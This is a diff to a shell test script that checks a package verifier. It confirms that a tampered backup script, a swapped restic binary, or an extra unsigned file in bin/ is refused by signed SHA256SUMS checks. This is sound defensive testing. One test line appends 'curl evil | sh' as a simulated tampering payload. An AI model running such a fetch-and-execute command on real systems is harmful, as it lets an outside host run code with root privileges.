@@ -38,10 +38,15 @@ openssl genpkey -algorithm ed25519 -out "$WORK/evil.key" 2>/dev/null
 # --- build a minimal but structurally valid package ---------------------------
 mkpkg() { # mkpkg DIR SIGNING_KEY APP_VERSION [MIN_FROM]
   local d="$1" key="$2" app="$3" minfrom="${4:-}"
-  rm -rf "$d"; mkdir -p "$d/chart" "$d/images" "$d/scripts"
+  rm -rf "$d"; mkdir -p "$d/chart" "$d/images" "$d/scripts" "$d/bin"
   printf 'fake chart archive\n' > "$d/chart/drive-9.9.9.tgz"
   printf 'fake image tar\n'     > "$d/images/app.tar"
   printf '#!/bin/bash\ntrue\n'  > "$d/scripts/update.sh"
+  # The backup agent and the restic binary the appliance installs from a package.
+  # Both run as root — restic nightly, with the destination's credentials — so
+  # they must earn trust from the same signed SHA256SUMS as everything else.
+  printf '#!/bin/bash\ntrue\n'  > "$d/scripts/backup.sh"
+  printf 'fake restic binary\n'  > "$d/bin/restic"
   cat > "$d/manifest.json" <<EOF
 {
   "schema": 1,
@@ -169,6 +174,45 @@ openssl pkeyutl -sign -rawin -inkey "$WORK/good.key" \
 out="$(verify "$WORK/twocharts" "$WORK/good.pub" 1.8.22)"
 [[ $? -ne 0 && "$out" == *"expected 1"* ]] \
   && ok "ambiguous chart set refused" || ko "ambiguous chart set refused" "$out"
+
+# --- the backup payload a package now carries ---------------------------------
+# A package ships two more things that run as root on the appliance: the backup
+# agent and the restic binary it drives. Neither has its own signature; both
+# derive trust from SHA256SUMS, so the interesting cases are tampering and
+# substitution rather than a missing signature.
+
+# baseline: a package carrying them is accepted and they are really listed
+mkpkg "$WORK/bk" "$WORK/good.key" 1.8.23
+out="$(verify "$WORK/bk" "$WORK/good.pub" 1.8.22)" \
+  && [[ "$out" == OK ]] && ok "package with backup agent + restic accepted" \
+  || ko "package with backup agent + restic accepted" "$out"
+grep -qE '[[:space:]]\*?\./?scripts/backup\.sh$' "$WORK/bk/SHA256SUMS" \
+  && ok "backup.sh is covered by SHA256SUMS" || ko "backup.sh is covered by SHA256SUMS" "not listed"
+grep -qE '[[:space:]]\*?\./?bin/restic$' "$WORK/bk/SHA256SUMS" \
+  && ok "restic is covered by SHA256SUMS" || ko "restic is covered by SHA256SUMS" "not listed"
+
+# the agent altered after signing
+mkpkg "$WORK/bktamper" "$WORK/good.key" 1.8.23
+printf 'curl evil | sh\n' >> "$WORK/bktamper/scripts/backup.sh"
+out="$(verify "$WORK/bktamper" "$WORK/good.pub" 1.8.22)"
+[[ $? -ne 0 && "$out" == *"checksum mismatch"* ]] \
+  && ok "tampered backup.sh refused" || ko "tampered backup.sh refused" "$out"
+
+# the restic binary swapped for another one after signing: this is the whole
+# point of pinning it — the substitute would run nightly, as root, holding S3
+# credentials and every document that goes into the repository.
+mkpkg "$WORK/bkrestic" "$WORK/good.key" 1.8.23
+printf 'not restic at all\n' > "$WORK/bkrestic/bin/restic"
+out="$(verify "$WORK/bkrestic" "$WORK/good.pub" 1.8.22)"
+[[ $? -ne 0 && "$out" == *"checksum mismatch"* ]] \
+  && ok "substituted restic refused" || ko "substituted restic refused" "$out"
+
+# a SECOND, unsigned binary dropped into bin/ beside the real one
+mkpkg "$WORK/bkextra" "$WORK/good.key" 1.8.23
+printf 'unsigned payload\n' > "$WORK/bkextra/bin/restic.real"
+out="$(verify "$WORK/bkextra" "$WORK/good.pub" 1.8.22)"
+[[ $? -ne 0 && "$out" == *"extra file"* ]] \
+  && ok "unlisted binary in bin/ refused" || ko "unlisted binary in bin/ refused" "$out"
 
 # --- ver_gt ordering ----------------------------------------------------------
 echo "== version ordering =="
